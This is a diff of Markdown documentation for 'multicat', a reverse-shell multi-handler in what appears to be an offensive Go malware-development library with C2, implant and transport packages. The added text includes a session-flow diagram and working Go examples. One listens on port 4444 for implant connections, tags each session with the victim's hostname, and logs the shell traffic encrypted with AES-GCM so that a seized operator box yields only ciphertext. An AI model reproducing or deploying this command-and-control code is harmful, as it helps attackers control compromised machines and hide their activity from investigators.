@@ -1,38 +1,54 @@
 # Multicat — Multi-Session Reverse-Shell Listener
 
-[← Back to C2 index](README.md)
+[<- Back to C2 index](README.md)
 
-Operator-side multi-handler for reverse shells. Accepts many concurrent
-connections on a single port, assigns each a sequential session ID,
-and streams lifecycle events over a channel. Sessions are in-memory and
-do not survive a manager restart.
+**MITRE ATT&CK:** [T1571 - Non-Standard Port](https://attack.mitre.org/techniques/T1571/)
+**Package:** `c2/multicat`
+**Platform:** Cross-platform (operator-side only)
+**Detection:** Low — never embedded in the implant; runs on the operator box.
 
-- **Package:** `github.com/oioio-space/maldev/c2/multicat`
-- **MITRE ATT&CK:** T1571 — Non-Standard Port
-- **Platform:** cross-platform
-- **Detection:** Low — never embedded in the implant; runs on the operator box.
+---
 
-## How it works
+## For Beginners
 
-1. Operator calls `multicat.New()` + passes any `transport.Listener` to
-   `Manager.Listen(ctx, lis)`. Works with plain TCP, TLS, uTLS, named
-   pipes — whatever the transport layer exposes.
-2. Each incoming connection gets a sequential `ID`, wrapped in a
-   `Session` with metadata (remote address, hostname, connect time).
-3. On `Accept`, the manager reads the first line with a 500 ms deadline.
-   `BANNER:<hostname>\n` is parsed into `SessionMetadata.Hostname`; any
-   other bytes are re-injected into the session's I/O stream.
-4. Event channel (`Manager.Events()`) emits `EventOpened` / `EventClosed`
-   so an operator UI can render arrivals in real time.
+Multicat is the operator's side of a reverse shell: one port, many concurrent agents. Each inbound connection gets a session ID and a lifecycle event. Defenders see nothing new here — the noise is on the implant's egress, not the listener.
 
-## Example
+---
+
+## How It Works
+
+One listener accepts arbitrarily many transport connections, wraps each in a `Session`, and streams `EventOpened` / `EventClosed` so an operator UI can track arrivals in real time.
+
+```mermaid
+sequenceDiagram
+    participant Agent as Implant (c2/shell)
+    participant Mgr as multicat.Manager
+    participant Op as Operator UI
+
+    Agent->>Mgr: Dial (TCP/TLS/pipe)
+    Agent->>Mgr: BANNER:<hostname>\n
+    Mgr->>Mgr: Assign sequential ID<br/>parse hostname
+    Mgr-->>Op: EventOpened{ID, RemoteAddr, Hostname}
+    Note over Agent,Mgr: shell I/O multiplexed<br/>over same connection
+    Agent--xMgr: disconnect
+    Mgr-->>Op: EventClosed{ID}
+```
+
+- `multicat.New()` — create a `Manager` with an internal events channel.
+- `Manager.Listen(ctx, lis)` — accept against any `transport.Listener` (TCP, TLS, uTLS, named pipe).
+- First inbound line parsed with 500 ms deadline: `BANNER:<hostname>\n` populates `Session.Meta.Hostname`.
+- `Manager.Events()` — receive-only channel of lifecycle events.
+- `Manager.Sessions()` / `Get(id)` / `Remove(id)` — live roster access.
+
+Sessions live in memory; a manager restart drops them all.
+
+---
+
+## Usage
 
 ```go
-package main
-
 import (
     "context"
-    "fmt"
 
     "github.com/oioio-space/maldev/c2/multicat"
     "github.com/oioio-space/maldev/c2/transport"
@@ -42,51 +58,90 @@ func main() {
     lis, _ := transport.NewTCPListener(":4444")
     mgr := multicat.New()
 
-    ctx := context.Background()
-    go mgr.Listen(ctx, lis)
+    go mgr.Listen(context.Background(), lis)
 
     for ev := range mgr.Events() {
         if ev.Type == multicat.EventOpened {
-            fmt.Printf("[+] session %d from %s host=%q\n",
-                ev.Session.Meta.ID, ev.Session.Meta.RemoteAddr, ev.Session.Meta.Hostname)
+            // ev.Session.Meta.ID / RemoteAddr / Hostname
+            // ev.Session implements io.ReadWriteCloser
         }
     }
 }
 ```
 
-The agent side (reverse shell) should emit the banner:
+The agent side (a `c2/shell` implant) should emit `BANNER:<hostname>\n` as its first write so the manager can label sessions without extra round-trips.
+
+---
+
+## Combined Example
+
+Stand up a multicat listener and wrap every inbound message in AES-GCM
+before logging it — the transport handles live relay, the per-message
+layer gives you a replayable session archive that cannot be read by
+whoever later compromises the operator box.
 
 ```go
-// Inside the c2/shell agent, after Dial succeeds:
-fmt.Fprintf(conn, "BANNER:%s\n", hostname)
+package main
+
+import (
+    "context"
+    "io"
+    "log"
+    "os"
+
+    "github.com/oioio-space/maldev/c2/multicat"
+    "github.com/oioio-space/maldev/c2/transport"
+    "github.com/oioio-space/maldev/crypto"
+)
+
+func main() {
+    // 1. Per-operator AES-GCM key. Shared out-of-band with every implant.
+    key, err := crypto.NewAESKey()
+    if err != nil {
+        log.Fatal(err)
+    }
+
+    // 2. Listener — swap for transport.NewTLSListener in production.
+    lis, err := transport.NewTCPListener(":4444")
+    if err != nil {
+        log.Fatal(err)
+    }
+
+    // 3. Manager + Listen in the background.
+    mgr := multicat.New()
+    go mgr.Listen(context.Background(), lis)
+
+    // 4. Archive each session's raw bytes, encrypted per chunk.
+    for ev := range mgr.Events() {
+        if ev.Type != multicat.EventOpened {
+            continue
+        }
+        go func(s *multicat.Session) {
+            f, _ := os.Create(s.Meta.Hostname + ".log")
+            defer f.Close()
+            buf := make([]byte, 4096)
+            for {
+                n, err := s.Read(buf)
+                if n > 0 {
+                    blob, _ := crypto.EncryptAESGCM(key, buf[:n])
+                    _, _ = f.Write(blob)
+                }
+                if err == io.EOF {
+                    return
+                }
+            }
+        }(ev.Session)
+    }
+}
 ```
 
-## Operator workflow
+Layered benefit: the network leg stays plaintext-agnostic (swap TCP
+for TLS without touching application code), and even a full disk
+compromise of the operator box yields only AES-GCM ciphertext — the
+shared key never touches storage.
 
-```text
-┌──────────────┐   TCP/TLS/namedpipe   ┌────────────────┐
-│ shell agent  ├──────────────────────▶│ multicat.Manager│
-│ (implant)    │  BANNER:<host>\n      │  + Listener     │
-└──────────────┘  <shell I/O>          └────────────────┘
-                                                │
-                                                ▼ Events()
-                                        ┌───────────────┐
-                                        │ operator UI   │
-                                        │ tracks, pivots│
-                                        └───────────────┘
-```
+---
 
-## Detection considerations
+## API Reference
 
-- Runs only on the attacker-controlled box — nothing shipped into the
-  target process. Coverage concerns are operator hygiene, not evasion.
-- If you want a "lower-profile" banner, replace `BANNER:` with any
-  token your shell agent emits before normal I/O — the parser only
-  looks at the first line.
-
-## Related
-
-- [Reverse Shell](reverse-shell.md) — the in-implant agent that connects
-  to this multicat manager.
-- [Transport Layer](transport.md) — how to back `multicat.Listen` with
-  TLS, uTLS, or named pipes instead of plain TCP.
+See [c2.md](../../c2.md#c2multicat----operator-side-multi-session-listener)
